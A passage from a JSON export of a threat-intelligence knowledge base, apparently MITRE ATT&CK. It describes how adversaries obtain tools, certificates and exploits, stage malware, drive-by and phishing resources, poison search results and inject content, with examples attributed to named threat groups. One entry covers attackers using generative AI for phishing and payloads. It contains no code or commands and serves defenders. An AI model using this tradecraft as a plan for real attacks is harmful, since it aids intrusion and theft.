                        "Description": "For <name>, the threat actors used a modified version of the open source PcShare remote administration tool.[62]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> has used a variety of widely-available tools, which in some cases they modified to add functionality and/or subvert antimalware solutions.[63]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> has obtained and used tools such as QuasarRAT and Remcos.[64]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has acquired, and sometimes customized, open source tools such as Mimikatz, Empire, VNC remote access software, and DIG.net.[65][66][67]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has obtained and used open-source tools such as LaZagne.[68]"
                    },
                    "G0136": {
                        "ID": "G0136",
                        "Name": "IndigoZebra",
                        "Description": "<name> has acquired open source tools such as NBTscan and Meterpreter for their operations.[69][70]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has obtained and used tools such as Mimikatz.[71]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has obtained and used tools such as Nirsoft WebBrowserPassVIew, Mimikatz, and PsExec.[72][73]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has obtained tools such as RVTools and AD Explorer for their operations.[74][75]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has obtained a variety of tools for their operations, including Responder and PuTTy PSCP.[76]"
                    },
                    "G0077": {
                        "ID": "G0077",
                        "Name": "Leafminer",
                        "Description": "<name> has obtained and used tools such as LaZagne, Mimikatz, PsExec, and MailSniper.[77]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has obtained an ARP spoofing tool from GitHub.[78]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink.[79][80][81][82][83]"
                    },
                    "G0045": {
                        "ID": "G0045",
                        "Name": "menuPass",
                        "Description": "<name> has used and modified open-source tools like Impacket, Mimikatz, and pwdump.[84]"
                    },
                    "G1013": {
                        "ID": "G1013",
                        "Name": "Metador",
                        "Description": "<name> has used Microsoft's Console Debugger in some of their operations.[85]"
                    },
                    "G1009": {
                        "ID": "G1009",
                        "Name": "Moses Staff",
                        "Description": "<name> has used the commercial tool DiskCryptor.[86]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has made use of legitimate tools ConnectWise and Remote Utilities to gain access to target environment.[87]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors obtained and used tools such as gsecdump.[88]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "For <name>, the threat actors obtained publicly-available JSP code that was used to deploy a webshell onto a compromised server.[89]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group obtained tools such as Wake-On-Lan, Responder, ChromePass, and dbxcli.[90][91]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors obtained packers such as CyaX.[92]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "For <name>, the threat actors obtained a variety of open source tools, including JexBoss, KeeThief, and BloodHound.[93]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has obtained and used open-source tools such as QuasarRAT.[94]"
                    },
                    "G0011": {
                        "ID": "G0011",
                        "Name": "PittyTiger",
                        "Description": "<name> has obtained and used tools such as Mimikatz and gsecdump.[95]"
                    },
                    "G1005": {
                        "ID": "G1005",
                        "Name": "POLONIUM",
                        "Description": "<name> has obtained and used tools such as AirVPN and plink in their operations.[44]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has acquired open-source tools for their operations, including Invoke-PSImage, which was used to establish an encrypted channel from a compromised host to <name>'s C2 server in preparation for the 2018 Winter Olympics attack, as well as Impacket and RemoteExec, which were used in their 2022 Prestige operations.[96][97]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has obtained and modified versions of publicly-available tools like Empire and PsExec.[98] [99]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has obtained free and publicly available tools including SingleFile and HTTrack to copy login pages of targeted organizations.[100][101]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used commodity remote access tools.[102]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used a variety of tools in their operations, including AdFind, BloodHound, Mimikatz, and PowerSploit.[103]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has obtained and used tools such as Impacket, pwdump, Mimikatz, gsecdump, NBTscan, and Windows Credential Editor.[104][105]"
                    },
                    "G0076": {
                        "ID": "G0076",
                        "Name": "Thrip",
                        "Description": "<name> has obtained and used tools such as Mimikatz and PsExec.[106]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles used tools such as Mimikatz and other open-source software.[107]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has obtained and customized publicly-available tools like Mimikatz.[108]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used customized versions of open-source tools for C2.[109]"
                    },
                    "G0107": {
                        "ID": "G0107",
                        "Name": "Whitefly",
                        "Description": "<name> has obtained and used tools such as Mimikatz.[110]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has obtained and used Empire for post-exploitation activities.[111]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has utilized tools such as Empire, Cobalt Strike, Cobalt Strike, Rubeus, AdFind, BloodHound, Metasploit, Advanced IP Scanner, Nirsoft PingInfoView, and SoftPerfect Network Scanner for targeting efforts.[112][113]"
                    }
                }
            },
            "003": {
                "name": "Code Signing Certificates",
                "href": "/techniques/T1588/003",
                "description": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.[1] Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.Prior to Code Signing, adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
                "Procedure": {
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used stolen code-signing certificates for its malicious payloads.[2]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> has stolen legitimate certificates to sign malicious payloads.[3]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers.[4]"
                    },
                    "S0576": {
                        "ID": "S0576",
                        "Name": "MegaCortex",
                        "Description": "<name> has used code signing certificates issued to fake companies to bypass security controls.[5]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group used code signing certificates issued by Sectigo RSA for some of its malware and tools.[6]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has obtained stolen valid certificates, including from VMProtect and the Chinese instant messaging application Youdu, for their operations.[7]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has obtained code signing certificates signed by DigiCert, GlobalSign, and COMOOD for malware payloads.[8][9]"
                    }
                }
            },
            "004": {
                "name": "Digital Certificates",
                "href": "/techniques/T1588/004",
                "description": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.Adversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or even enabling Adversary-in-the-Middle if the certificate is trusted or otherwise added to the root of trust (i.e. Install Root Certificate). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.[1] Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.Certificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.[2]After obtaining a digital certificate, an adversary may then install that certificate (see Install Digital Certificate) on infrastructure under their control.",
                "Procedure": {
                    "G0098": {
                        "ID": "G0098",
                        "Name": "BlackTech",
                        "Description": "<name> has used valid, stolen digital certificates for some of their malware and tools.[3]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has obtained SSL certificates for their C2 domains.[4]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used a valid digital certificate for some of their malware.[5]"
                    },
                    "C0006": {
                        "ID": "C0006",
                        "Name": "Operation Honeybee",
                        "Description": "For <name>, the threat actors stole a digital signature from Adobe Systems to use with their MaoCheng dropper.[6]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has obtained free Let's Encrypt SSL certificates for use on their phishing pages.[7][8]"
                    }
                }
            },
            "005": {
                "name": "Exploits",
                "href": "/techniques/T1588/005",
                "description": "Adversaries may buy, steal, or download exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than developing their own exploits, an adversary may find/modify exploits from online or purchase them from exploit vendors.[1][2][3]In addition to downloading free exploits from the internet, adversaries may purchase exploits from third-party entities. Third-party entities can include technology companies that specialize in exploit development, criminal marketplaces (including exploit kits), or from individuals.[4][5] In addition to purchasing exploits, adversaries may steal and repurpose exploits from third-party entities (including other adversaries).[2]An adversary may monitor exploit provider forums to understand the state of existing, as well as newly discovered, exploits. There is usually a delay between when an exploit is discovered and when it is made public. An adversary may target the systems of those known to conduct exploit research and development in order to gain that knowledge for use during a subsequent operation.Adversaries may use exploits during various phases of the adversary lifecycle (i.e. Exploit Public-Facing Application, Exploitation for Client Execution, Exploitation for Privilege Escalation, Exploitation for Defense Evasion, Exploitation for Credential Access, Exploitation of Remote Services, and Application or System Exploitation).",
                "Procedure": {
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has obtained exploit code for various CVEs.[6]"
                    }
                }
            },
            "006": {
                "name": "Vulnerabilities",
                "href": "/techniques/T1588/006",
                "description": "Adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.[1]An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).",
                "Procedure": {
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "In 2017, <name> conducted technical research related to vulnerabilities associated with websites used by the Korean Sport and Olympic Committee, a Korean power company, and a Korean airport.[2]"
                    }
                }
            },
            "007": {
                "name": "Artificial Intelligence",
                "href": "/techniques/T1588/007",
                "description": "Adversaries may obtain access to generative artificial intelligence tools, such as large language models (LLMs), to aid various techniques during targeting. These tools may be used to inform, bolster, and enable a variety of malicious tasks including conducting Reconnaissance, creating basic scripts, assisting social engineering, and even developing payloads.[1]For example, by utilizing a publicly available LLM an adversary is essentially outsourcing or automating certain tasks to the tool. Using AI, the adversary may draft and generate content in a variety of written languages to be used in Phishing/Phishing for Information campaigns. The same publicly available tool may further enable vulnerability or other offensive research supporting Develop Capabilities. AI tools may also automate technical tasks by generating, refining, or otherwise enhancing (e.g., Obfuscated Files or Information) malicious scripts and payloads.[2]",
                "Procedure": {}
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may buy and/or steal capabilities that can be used during targeting. Rather than developing their own capabilities in-house, adversaries may purchase, freely download, or steal them. Activities may include the acquisition of malware, software (including licenses), exploits, certificates, and information relating to vulnerabilities. Adversaries may obtain capabilities to support their operations throughout numerous phases of the adversary lifecycle.In addition to downloading free malware, software, and exploits from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware and exploits, criminal marketplaces, or from individuals.[1][2]In addition to purchasing capabilities, adversaries may steal capabilities from third-party entities (including other adversaries). This can include stealing software licenses, malware, SSL/TLS and code-signing certificates, or raiding closed databases of vulnerabilities or exploits.[3]",
        "Procedure": {}
    },
    "T1608": {
        "ttp_name": "Stage Capabilities",
        "ttp_id": "T1608",
        "href": "/techniques/T1608",
        "subtechnique": {
            "001": {
                "name": "Upload Malware",
                "href": "/techniques/T1608/001",
                "description": "Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.Malware may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.[1][2]Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via User Execution. Masquerading may increase the chance of users mistakenly executing these files.",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.[1]"
                    },
                    "G1002": {
                        "ID": "G1002",
                        "Name": "BITTER",
                        "Description": "<name> has registered domains to stage payloads.[3]"
                    },
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "For <name>, UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system.[4]"
                    },
                    "C0011": {
                        "ID": "C0011",
                        "Name": "C0011",
                        "Description": "For <name>, Transparent Tribe hosted malicious documents on domains registered by the group.[5]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "For <name>, the threat actors uploaded malware to websites under their control.[6][7]"
                    },
                    "G1006": {
                        "ID": "G1006",
                        "Name": "Earth Lusca",
                        "Description": "<name> has staged malware and malicious files on compromised web servers, GitHub, and Google Drive.[8]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name>  has uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive.[9]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3.[10]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has registered domains to stage payloads.[11][12]"
                    },
                    "G1001": {
                        "ID": "G1001",
                        "Name": "HEXANE",
                        "Description": "<name> has staged malware on fraudulent websites set up to impersonate targeted organizations.[13]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used Blogspot to host malicious content such as beacons, file exfiltrators, and implants.[14]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has hosted open-source remote access Trojans used in its operations in GitHub.[15]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has hosted malicious payloads on Dropbox.[16]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has hosted malicious payloads on DropBox including PlugX.[17]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has hosted payloads on acquired second-stage servers for periods of either days, weeks, or months.[18]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors uploaded commonly available hacker tools to compromised web servers.[19]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group used compromised servers to host malware.[20][21][22][23]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "For <name>, the threat actors staged malicious files on Dropbox and other websites.[24]"
                    },
                    "C0005": {
                        "ID": "C0005",
                        "Name": "Operation Spalax",
                        "Description": "For <name>, the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.[25]"
                    },
                    "G1008": {
                        "ID": "G1008",
                        "Name": "SideCopy",
                        "Description": "<name> has used compromised domains to host its malicious payloads.[26]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.[27][28]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has staged malware on actor-controlled domains.[29]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has uploaded backdoored Docker images to Docker Hub.[30]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has hosted malicious payloads on Dropbox.[31]"
                    }
                }
            },
            "002": {
                "name": "Upload Tool",
                "href": "/techniques/T1608/002",
                "description": "Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.Tools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure).[1] Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.[2][3][4]Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
                "Procedure": {
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "For <name>, UNC3890 actors staged tools on their infrastructure to download directly onto a compromised system.[5]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "For <name>, Lazarus Group used multiple servers to host malicious tools.[6]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has staged tools, including gsecdump and WCE, on previously compromised websites.[1]"
                    }
                }
            },
            "003": {
                "name": "Install Digital Certificate",
                "href": "/techniques/T1608/003",
                "description": "Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.[1]Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: Asymmetric Cryptography with Web Protocols) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. Adversaries can obtain digital certificates (see Digital Certificates) or create self-signed certificates (see Digital Certificates). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).",
                "Procedure": {}
            },
            "004": {
                "name": "Drive-by Target",
                "href": "/techniques/T1608/004",
                "description": "Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in Drive-by Compromise. In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as Application Access Token. Prior to Drive-by Compromise, adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired (Acquire Infrastructure) or previously compromised (Compromise Infrastructure).Adversaries may upload or inject malicious web content, such as JavaScript, into websites.[1][2] This may be done in a number of ways, including:Inserting malicious scripts into web pages or other user controllable web content such as forum postsModifying script files served to websites from publicly writeable cloud storage bucketsCrafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., Malvertising)In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in Gather Victim Host Information) to ensure it is vulnerable prior to attempting exploitation.[3]Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Drive-by Compromise.",
                "Procedure": {
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has stood up websites containing numerous articles and content scraped from the Internet to make them appear legitimate, but some of these pages include malicious JavaScript to profile the potential victim or infect them via a fake software update.[4]"
                    },
                    "C0010": {
                        "ID": "C0010",
                        "Name": "C0010",
                        "Description": "For <name>, the threat actors compromised the login page of a legitimate Israeli shipping company and likely established a watering hole that collected visitor information.[5]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has compromised websites to redirect traffic and to host exploit kits.[6]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products.[7]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has redirected compromised machines to an actor-controlled webpage through HTML injection.[8]"
                    },
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has injected malicious JavaScript into compromised websites to infect victims via drive-by download.[9][10][11][12]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has embedded malicious code into websites to screen a potential victim's IP address and then exploit their browser if they are of interest.[2]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has set up websites with malicious hyperlinks and iframes to infect targeted victims with Crimson, njRAT, and other malicious tools.[13][14][15]"
                    }
                }
            },
            "005": {
                "name": "Link Target",
                "href": "/techniques/T1608/005",
                "description": "Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. Typically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link.[1][2] Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.[3][4]Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.[5][6][7][8] In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).[9][10][11][12] Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.[13]",
                "Procedure": {
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has created a link to a Dropbox file that has been used in their spear-phishing operations.[14]"
                    },
                    "G0122": {
                        "ID": "G0122",
                        "Name": "Silent Librarian",
                        "Description": "<name> has cloned victim organization login pages and staged them for later use in credential harvesting campaigns. <name> has also made use of a variety of URL shorteners for these staged websites.[15][1][2]"
                    }
                }
            },
            "006": {
                "name": "SEO Poisoning",
                "href": "/techniques/T1608/006",
                "description": "Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site\u2019s ranking/score/reputation calculated by their web crawlers and algorithms.[1][2]To help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).[3][1]Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site\u2019s calculated relevance and reputation.[2][4]SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.[3][5]",
                "Procedure": {
                    "G1020": {
                        "ID": "G1020",
                        "Name": "Mustard Tempest",
                        "Description": "<name> has poisoned search engine results to return fake software updates in order to distribute malware.[6][7]"
                    }
                }
            }
        },
        "tactic": "Resource Development",
        "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed (Develop Capabilities) or obtained (Obtain Capabilities) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.[1][2][3][4][5]Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):Staging web resources necessary to conduct Drive-by Compromise when a user browses to a site.[6][7][8]Staging web resources for a link target to be used with spearphishing.[9][10]Uploading malware or tools to a location accessible to a victim network to enable Ingress Tool Transfer.[1]Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: Asymmetric Cryptography with Web Protocols).[11]",
        "Procedure": {
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has used servers under their control to validate tracking pixels sent to phishing victims.[12]"
            }
        }
    },
    "T1659": {
        "ttp_name": "Content Injection",
        "ttp_id": "T1659",
        "href": "/techniques/T1659",
        "tactic": "Initial Access",
        "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., Drive-by Target followed by Drive-by Compromise), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., Ingress Tool Transfer) and other data to already compromised systems.[1]Adversaries may inject content to victim systems in various ways, including:From the middle, where the adversary is in-between legitimate online client-server communications (Note: this is similar but distinct from Adversary-in-the-Middle, which describes AiTM activity solely within an enterprise environment) [2]From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server [3]Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"[3][1][4]",
        "Procedure": {
            "S1088": {
                "ID": "S1088",
                "Name": "Disco",
                "Description": "malware has achieved initial access and execution through content injection into DNS,  HTTP, and SMB replies to targeted hosts that redirect them to download malicious files.[5]"
            },
            "G1019": {
                "ID": "G1019",
                "Name": "MoustachedBouncer",
                "Description": "malware has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.[5]"
            }
        }
    },
    "T1189": {
        "ttp_name": "Drive-by Compromise",
        "ttp_id": "T1189",
        "href": "/techniques/T1189",
        "tactic": "Initial Access",
